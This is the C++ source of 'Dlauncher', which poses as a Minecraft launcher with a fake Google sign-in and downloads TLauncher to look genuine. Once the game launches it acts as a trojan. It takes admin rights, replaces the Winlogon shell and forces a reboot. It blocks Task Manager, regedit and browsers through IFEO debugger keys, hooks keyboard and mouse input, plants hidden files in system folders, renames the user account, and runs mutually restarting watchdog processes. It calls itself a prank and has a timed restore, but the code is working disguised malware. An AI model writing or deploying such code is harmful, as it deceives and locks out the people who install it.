#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <mmsystem.h> // Для PlaySoundW
#include <shellapi.h>
#include <urlmon.h>
#include <shlobj.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdio>
#include <cwchar>
#include <cstdlib>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

using namespace Gdiplus;

// ============================================================
// НАСТРОЙКИ
// ============================================================
const wchar_t* GAME_ZIP_URL = L"https://github.com/moiSentineL/portabletl/releases/download/latest/PortableTL-latest.zip";
const wchar_t* KOCTYA_URL   = L"https://raw.githubusercontent.com/darkjoons3-hue/Dlauncher-minecraft/main/kocty.png";
const wchar_t* MUSIC_URL    = L"https://raw.githubusercontent.com/darkjoons3-hue/Dlauncher-minecraft/main/kocty.mp3";

const int GAME_TIME_SEC = 10;       // 10 сек после запуска игры (для теста)
const int REBOOT_TIME_SEC = 10;     // 10 сек до ребута
const int PRANK_DURATION_SEC = 120; // 2 минуты пранка (для теста, в реале 10800 = 3 часа)

// ============================================================
// ГЛОБАЛЫ
// ============================================================
enum AppState { STATE_LOGIN = 0, STATE_CREATE_ACC = 1, STATE_MAIN_MENU = 2, STATE_DOWNLOADING = 3, STATE_READY = 4 };

HINSTANCE g_hInst = nullptr;
HWND g_hWnd = nullptr;
HWND g_hEdit = nullptr;
AppState g_state = STATE_LOGIN;
int g_downloadProgress = 0;
std::wstring g_username = L"";
std::wstring g_installDir = L"";
int g_activeTab = 0;
std::atomic<bool> g_prankRunning{false};
std::vector<std::wstring> g_virusFiles;

HHOOK g_hKeyboardHook = nullptr;
HHOOK g_hMouseHook = nullptr;

const COLORREF BG = RGB(20, 20, 24);
const COLORREF BG_PANEL = RGB(30, 30, 36);
const COLORREF ACCENT = RGB(80, 180, 80);
const COLORREF TEXT = RGB(240, 240, 240);
const COLORREF TEXT_DIM = RGB(120, 120, 120);

// ============================================================
// УТИЛИТЫ
// ============================================================
void SetRegStr(HKEY root, const std::wstring& sub, const std::wstring& val, const std::wstring& data) {
    HKEY h; if (RegCreateKeyExW(root, sub.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, val.c_str(), 0, REG_SZ, (const BYTE*)data.c_str(), (DWORD)((data.length()+1)*sizeof(wchar_t)));
        RegCloseKey(h);
    }
}

bool GetRegInt(HKEY root, const std::wstring& sub, const std::wstring& val, DWORD* out) {
    HKEY h; DWORD sz = sizeof(DWORD);
    if (RegOpenKeyExW(root, sub.c_str(), 0, KEY_READ, &h) == ERROR_SUCCESS) {
        bool res = RegQueryValueExW(h, val.c_str(), nullptr, nullptr, (LPBYTE)out, &sz) == ERROR_SUCCESS;
        RegCloseKey(h);
        return res;
    }
    return false;
}

void SetRegInt(HKEY root, const std::wstring& sub, const std::wstring& val, DWORD data) {
    HKEY h; if (RegCreateKeyExW(root, sub.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, val.c_str(), 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
        RegCloseKey(h);
    }
}

bool IsPrankActive() {
    DWORD active = 0;
    GetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"PrankActive", &active);
    return active == 1;
}

void BlockApp(const wchar_t* exe) {
    std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
    path += exe;
    SetRegStr(HKEY_LOCAL_MACHINE, path, L"Debugger", L"cmd.exe /c echo Access Denied & pause");
}

void SaveStartTime() {
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
    DWORD startTime = (DWORD)(uli.QuadPart / 10000000LL);
    SetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"StartTime", startTime);
}

bool IsTimeToRestore() {
    DWORD startTime = 0;
    if (!GetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"StartTime", &startTime)) return false;
    
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
    DWORD currentTime = (DWORD)(uli.QuadPart / 10000000LL);
    return (currentTime >= startTime + PRANK_DURATION_SEC);
}

bool IsAdmin() {
    BOOL isAdmin = FALSE; PSID adminGroup = NULL; SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin); FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

void ElevateNow() {
    wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas"; sei.lpFile = szPath; sei.hwnd = NULL; sei.nShow = SW_NORMAL;
    ShellExecuteExW(&sei);
    exit(0);
}

// ============================================================
// ВОССТАНОВЛЕНИЕ
// ============================================================
void RestoreSystem() {
    g_prankRunning = false;
    // Ставим флаг, что пранк окончен (для стражей)
    SetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"PrankActive", 0);

    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
    if (g_hMouseHook) UnhookWindowsHookEx(g_hMouseHook);
    PlaySoundW(nullptr, nullptr, 0);

    for (const auto& path : g_virusFiles) DeleteFileW(path.c_str());

    // Чистим IFEO
    const wchar_t* blocked[] = { L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe", L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe", L"notepad.exe", L"osk.exe" };
    for (auto b : blocked) {
        std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"; path += b;
        RegDeleteKeyW(HKEY_LOCAL_MACHINE, path.c_str());
    }

    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ru-RU");
    
    // Возвращаем Shell и удаляем задачу
    SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"explorer.exe");
    system("schtasks /delete /tn \"EmergencyRestore\" /f >nul 2>&1");
    DeleteFileW(L"C:\\Windows\\Temp\\emergency_restore.bat");

    // Запускаем проводник на всякий случай
    if (FindWindowW(L"Shell_TrayWnd", NULL) == NULL) {
        ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);
    }

    MessageBoxW(nullptr, L"Пранк окончен. Все ваши файлы на месте. Это была шутка Кости.", L"Dlauncher", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    exit(0);
}

// ============================================================
// СТРАЖИ (WATCHDOG)
// ============================================================
void RunWatchdog() {
    CreateMutexW(NULL, TRUE, L"Global\\DlauncherWatchMutex");
    while (IsPrankActive()) {
        HANDLE hMain = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DlauncherMainMutex");
        if (hMain == NULL) {
            // Главный процесс умер, перезапускаем
            wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
            ShellExecuteW(NULL, L"open", szPath, L"--silent", NULL, SW_HIDE);
        } else {
            CloseHandle(hMain);
        }
        Sleep(2000);
    }
    exit(0);
}

void MainWatchdogThread() {
    while (IsPrankActive()) {
        HANDLE hWatch = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DlauncherWatchMutex");
        if (hWatch == NULL) {
            wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
            ShellExecuteW(NULL, L"open", szPath, L"--watchdog", NULL, SW_HIDE);
        } else {
            CloseHandle(hWatch);
        }
        Sleep(2000);
    }
}

// ============================================================
// АКТИВАЦИЯ И ЛОГИКА ПРАНКА
// ============================================================
void ActivatePrank() {
    SetRegInt(HKEY_CURRENT_USER, L"Software\\Dlauncher", L"PrankActive", 1);
    
    wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    // 1. Аварийный батник
    const char* batContent = 
        "@echo off\n"
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe\" /f\n"
        "schtasks /delete /tn \"EmergencyRestore\" /f\n"
        "del \"C:\\Windows\\Temp\\emergency_restore.bat\"\n";
    HANDLE hBat = CreateFileW(L"C:\\Windows\\Temp\\emergency_restore.bat", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD wr; WriteFile(hBat, batContent, (DWORD)strlen(batContent), &wr, nullptr); CloseHandle(hBat);
    }
    // Создаем задачу в Планировщике (при входе в систему)
    system("schtasks /create /tn \"EmergencyRestore\" /tr \"C:\\Windows\\Temp\\emergency_restore.bat\" /sc onlogon /ru SYSTEM /f >nul 2>&1");

    // 2. Подмена Shell и сохранение времени
    SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"\"" + std::wstring(szPath) + L"\" --silent");
    SaveStartTime();

    // 3. Перезагрузка (в отдельном потоке, чтобы не блокировать UI)
    std::thread([](){
        MessageBoxW(nullptr, L"Ваш сеанс завершится через 10 секунд.", L"Windows", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
        Sleep(REBOOT_TIME_SEC * 1000);
        HANDLE hToken; TOKEN_PRIVILEGES tkp;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
    }).detach();
}

DWORD WINAPI KostyaThread(LPVOID) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int x = sw / 2, y = sh / 2, vx = 15, vy = 15;
    std::wstring imgPath = g_installDir + L"\\kocty.png";
    
    HDC hdc = GetDC(nullptr);
    Image image(imgPath.c_str()); // Загружаем 1 раз
    
    while (g_prankRunning.load()) {
        // Очищаем экран (черный фон) перед отрисовкой
        HBRUSH black = CreateSolidBrush(RGB(0,0,0));
        RECT r = {0,0,sw,sh}; FillRect(hdc, &r, black); DeleteObject(black);
        
        if (image.GetLastStatus() == Ok) {
            Graphics graphics(hdc);
            graphics.DrawImage(&image, x, y, image.GetWidth() / 2, image.GetHeight() / 2);
        }
        
        x += vx; y += vy;
        if (x < 0 || x > sw - 200) vx = -vx;
        if (y < 0 || y > sh - 200) vy = -vy;
        Sleep(16);
    }
    ReleaseDC(nullptr, hdc);
    return 0;
}

DWORD WINAPI WatchdogFilesThread(LPVOID) {
    while (g_prankRunning.load()) {
        for (const auto& path : g_virusFiles) {
            if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
                HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
                if (h != INVALID_HANDLE_VALUE) {
                    const char* msg = "КОСТЯ СОЖРАЛ ВАШИ ФАЙЛЫ";
                    DWORD written; WriteFile(h, msg, (DWORD)strlen(msg), &written, nullptr);
                    CloseHandle(h);
                }
            }
        }
        Sleep(1000);
    }
    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_prankRunning.load()) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) return 1;
        if (p->vkCode == 'L' && (GetAsyncKeyState(VK_LWIN) & 0x8000)) return 1;
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_prankRunning.load()) {
        MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam;
        if (wParam == WM_LBUTTONDOWN) {
            int sh = GetSystemMetrics(SM_CYSCREEN);
            if (p->pt.y > sh - 60) {
                if (p->pt.x > 60 && p->pt.x < 250) {
                    MessageBoxW(nullptr, L"И да, Константин сожрал даже поиск ваш)", L"Search", MB_OK | MB_ICONWARNING);
                    return 1;
                }
            }
        }
    }
    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

void RunSilentMode() {
    // КРИТИЧЕСКИ ВАЖНО: Ранний возврат Shell, чтобы при краше не окирпичить систему
    SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", L"explorer.exe");

    g_prankRunning = true;
    CreateMutexW(NULL, TRUE, L"Global\\DlauncherMainMutex");
    
    // Запускаем стража и фоновый таймер
    std::thread([](){
        while (IsPrankActive()) {
            if (IsTimeToRestore()) {
                RestoreSystem();
                break;
            }
            Sleep(5000); // Проверка раз в 5 сек
        }
    }).detach();
    
    std::thread(MainWatchdogThread).detach();

    MessageBoxW(nullptr, L"У тя 10 секунд. Потом вернемся к этому же месту)", L"System", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
    Sleep(10000); 

    ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);

    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
    g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);

    PlaySoundW((g_installDir + L"\\kocty.mp3").c_str(), nullptr, SND_FILENAME | SND_ASYNC | SND_LOOP);
    CreateThread(nullptr, 0, KostyaThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, WatchdogFilesThread, nullptr, 0, nullptr);

    const wchar_t* blocked[] = { L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe", L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe", L"notepad.exe", L"osk.exe" };
    for (auto b : blocked) BlockApp(b);
    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ar-SA");
    system("net user %USERNAME% /fullname:\"КОСТЯ СОЖРАЛ ВАШ НИК\" >nul 2>&1");

    const wchar_t* dirs[] = { L"C:\\", L"C:\\Windows", L"C:\\Program Files", L"C:\\Users", L"C:\\Users\\Public" };
    for (int i = 0; i < 15; ++i) {
        wchar_t path[MAX_PATH]; swprintf_s(path, L"%s\\file_%d.txt", dirs[i % 5], i);
        g_virusFiles.push_back(path);
        HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            const char* msg = "КОСТЯ СОЖРАЛ ВАШИ ФАЙЛЫ";
            DWORD written; WriteFile(h, msg, (DWORD)strlen(msg), &written, nullptr);
            CloseHandle(h);
        }
    }

    MSG msg; while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
}

// ============================================================
// UI ЛАУНЧЕРА
// ============================================================
void FillRectC(HDC dc, RECT rc, COLORREF c) { HBRUSH b = CreateSolidBrush(c); FillRect(dc, &rc, b); DeleteObject(b); }
void DrawTextCentered(HDC dc, const wchar_t* t, RECT rc, COLORREF c, int fs, bool b) {
    SetBkMode(dc, TRANSPARENT); SetTextColor(dc, c);
    HFONT f = CreateFontW(fs, 0, 0, 0, b ? FW_BOLD : FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
    HFONT o = (HFONT)SelectObject(dc, f); DrawTextW(dc, t, -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    SelectObject(dc, o); DeleteObject(f);
}
void DrawCustomButton(HDC dc, RECT rc, const wchar_t* t, bool hover, bool accent) {
    COLORREF bg = accent ? (hover ? RGB(100, 200, 100) : ACCENT) : (hover ? RGB(60, 60, 70) : BG_PANEL);
    FillRectC(dc, rc, bg); DrawTextCentered(dc, t, rc, accent ? RGB(255,255,255) : TEXT, 16, true);
}

DWORD WINAPI DownloadThread(LPVOID) {
    g_downloadProgress = 5; InvalidateRect(g_hWnd, nullptr, FALSE);
    std::wstring zipPath = g_installDir + L"\\game.zip";
    HRESULT hr = URLDownloadToFileW(nullptr, GAME_ZIP_URL, zipPath.c_str(), 0, nullptr);
    
    if (SUCCEEDED(hr)) {
        g_downloadProgress = 40; InvalidateRect(g_hWnd, nullptr, FALSE);
        URLDownloadToFileW(nullptr, KOCTYA_URL, (g_installDir + L"\\kocty.png").c_str(), 0, nullptr);
        URLDownloadToFileW(nullptr, MUSIC_URL, (g_installDir + L"\\kocty.mp3").c_str(), 0, nullptr);
        g_downloadProgress = 60; InvalidateRect(g_hWnd, nullptr, FALSE); Sleep(500);
        
        std::wstring cmd = L"tar.exe -xf \"" + zipPath + L"\" -C \"" + g_installDir + L"\"";
        STARTUPINFOW si = { sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi;
        if (CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        g_downloadProgress = 100; InvalidateRect(g_hWnd, nullptr, FALSE); Sleep(500);
        g_state = STATE_READY; InvalidateRect(g_hWnd, nullptr, TRUE);
    }
    return 0;
}

LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int hoverBtn = 0;
    switch (m) {
    case WM_CREATE:
        g_hWnd = h;
        g_hEdit = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_BORDER | ES_CENTER, 200, 200, 200, 30, h, (HMENU)100, g_hInst, nullptr);
        {
            HFONT f = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
            SendMessageW(g_hEdit, WM_SETFONT, (WPARAM)f, TRUE);
            wchar_t appData[MAX_PATH]; SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appData);
            g_installDir = std::wstring(appData) + L"\\Dlauncher\\game";
            CreateDirectoryW((std::wstring(appData) + L"\\Dlauncher").c_str(), nullptr);
            CreateDirectoryW(g_installDir.c_str(), nullptr);
        }
        return 0;
    case WM_CTLCOLOREDIT: {
        HDC dc = (HDC)w; SetTextColor(dc, TEXT); SetBkColor(dc, BG_PANEL);
        static HBRUSH br = CreateSolidBrush(BG_PANEL); return (LRESULT)br;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps); RECT rc; GetClientRect(h, &rc);
        FillRectC(dc, rc, BG);
        FillRectC(dc, { 0, 0, rc.right, 60 }, BG_PANEL);
        DrawTextCentered(dc, L"Dlauncher", { 0, 0, rc.right, 60 }, ACCENT, 24, true);
        
        if (g_state != STATE_CREATE_ACC) ShowWindow(g_hEdit, SW_HIDE);

        if (g_state == STATE_LOGIN) {
            DrawTextCentered(dc, L"Для продолжения войдите через аккаунт Google", { 0, 100, rc.right, 150 }, TEXT, 18, false);
            RECT btn = { rc.right/2 - 100, 200, rc.right/2 + 100, 250 };
            DrawCustomButton(dc, btn, L"Войти через Google", hoverBtn, true);
        } else if (g_state == STATE_CREATE_ACC) {
            DrawTextCentered(dc, L"Создание профиля", { 0, 100, rc.right, 150 }, TEXT, 22, true);
            ShowWindow(g_hEdit, SW_SHOW); SetWindowPos(g_hEdit, HWND_TOP, rc.right/2 - 100, 200, 200, 35, SWP_NOACTIVATE);
            RECT btn = { rc.right/2 - 100, 260, rc.right/2 + 100, 310 };
            DrawCustomButton(dc, btn, L"Создать аккаунт", hoverBtn, true);
        } else if (g_state == STATE_MAIN_MENU || g_state == STATE_READY) {
            FillRectC(dc, { 0, 60, 200, rc.bottom }, BG_PANEL);
            DrawTextCentered(dc, L"Играть", { 0, 100, 200, 140 }, ACCENT, 18, true);
            DrawTextCentered(dc, (L"Добро пожаловать, " + g_username).c_str(), { 220, 80, rc.right, 120 }, TEXT, 20, true);
            DrawTextCentered(dc, L"Minecraft 1.12.2", { 220, 150, rc.right, 190 }, TEXT, 18, false);
            RECT btn = { rc.right - 220, rc.bottom - 80, rc.right - 20, rc.bottom - 30 };
            DrawCustomButton(dc, btn, (g_state == STATE_READY) ? L"▶ ИГРАТЬ" : L"Скачать", hoverBtn, true);
        } else if (g_state == STATE_DOWNLOADING) {
            DrawTextCentered(dc, L"Загрузка...", { 0, 100, rc.right, 140 }, TEXT, 20, true);
            RECT pbBg = { 100, 220, rc.right - 100, 240 }; FillRectC(dc, pbBg, BG_PANEL);
            RECT pbFg = { 100, 220, 100 + ((rc.right - 200) * g_downloadProgress / 100), 240 }; FillRectC(dc, pbFg, ACCENT);
        }
        EndPaint(h, &ps); return 0;
    }
    case WM_MOUSEMOVE: {
        int x = LOWORD(l), y = HIWORD(l); RECT rc; GetClientRect(h, &rc);
        int hb = 0;
        if (g_state == STATE_LOGIN) { RECT r = { rc.right/2 - 100, 200, rc.right/2 + 100, 250 }; hb = (x>=r.left&&x<=r.right&&y>=r.top&&y<=r.bottom); }
        else if (g_state == STATE_CREATE_ACC) { RECT r = { rc.right/2 - 100, 260, rc.right/2 + 100, 310 }; hb = (x>=r.left&&x<=r.right&&y>=r.top&&y<=r.bottom); }
        else if (g_state == STATE_MAIN_MENU || g_state == STATE_READY) { RECT r = { rc.right - 220, rc.bottom - 80, rc.right - 20, rc.bottom - 30 }; hb = (x>=r.left&&x<=r.right&&y>=r.top&&y<=r.bottom); }
        if (hb != hoverBtn) { hoverBtn = hb; InvalidateRect(h, nullptr, FALSE); }
        if (hb) SetCursor(LoadCursor(nullptr, IDC_HAND)); else SetCursor(LoadCursor(nullptr, IDC_ARROW));
        return 0;
    }
    case WM_LBUTTONDOWN: {
        int x = LOWORD(l), y = HIWORD(l); RECT rc; GetClientRect(h, &rc);
        auto ins = [](RECT r, int px, int py) { return px >= r.left && px <= r.right && py >= r.top && py <= r.bottom; };
        
        if (g_state == STATE_LOGIN) {
            RECT btn = { rc.right/2 - 100, 200, rc.right/2 + 100, 250 };
            if (ins(btn, x, y)) { ShellExecuteW(nullptr, L"open", L"https://accounts.google.com/", nullptr, nullptr, SW_SHOW); Sleep(3000); g_state = STATE_CREATE_ACC; InvalidateRect(h, nullptr, TRUE); }
        }
        else if (g_state == STATE_CREATE_ACC) {
            RECT btn = { rc.right/2 - 100, 260, rc.right/2 + 100, 310 };
            if (ins(btn, x, y)) {
                wchar_t buf[64] = {}; GetWindowTextW(g_hEdit, buf, 64);
                if (wcslen(buf) > 0) { g_username = buf; g_state = STATE_MAIN_MENU; InvalidateRect(h, nullptr, TRUE); }
            }
        }
        else if (g_state == STATE_MAIN_MENU) {
            RECT btn = { rc.right - 220, rc.bottom - 80, rc.right - 20, rc.bottom - 30 };
            if (ins(btn, x, y)) { g_state = STATE_DOWNLOADING; InvalidateRect(h, nullptr, TRUE); CreateThread(nullptr, 0, DownloadThread, nullptr, 0, nullptr); }
        }
        else if (g_state == STATE_READY) {
            RECT btn = { rc.right - 220, rc.bottom - 80, rc.right - 20, rc.bottom - 30 };
            if (ins(btn, x, y)) {
                std::wstring launcher = g_installDir + L"\\TLauncher.exe";
                ShellExecuteW(nullptr, L"open", launcher.c_str(), nullptr, g_installDir.c_str(), SW_SHOW);
                
                CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
                    Sleep(GAME_TIME_SEC * 1000);
                    ActivatePrank();
                    return 0;
                }, nullptr, 0, nullptr);
            }
        }
        return 0;
    }
    case WM_DESTROY: PostQuitMessage(0); return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR lpCmdLine, int) {
    g_hInst = hInst;

    if (wcsstr(lpCmdLine, L"--watchdog") != nullptr) {
        RunWatchdog();
        return 0;
    }
    if (wcsstr(lpCmdLine, L"--silent") != nullptr) {
        RunSilentMode();
        return 0;
    }

    if (!IsAdmin()) ElevateNow();
    CreateMutexW(NULL, TRUE, L"Global\\DlauncherMainMutex");

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WNDCLASSW wc = {}; wc.hInstance = hInst; wc.lpfnWndProc = WndProc; wc.lpszClassName = L"DlauncherWnd"; wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassW(&wc);
    int w = 800, h = 500, sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    g_hWnd = CreateWindowExW(0, L"DlauncherWnd", L"Dlauncher", WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME, (sw-w)/2, (sh-h)/2, w, h, nullptr, nullptr, hInst, nullptr);
    ShowWindow(g_hWnd, SW_SHOW); UpdateWindow(g_hWnd);
    MSG msg; while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    
    GdiplusShutdown(gdiplusToken);
    return 0;
}
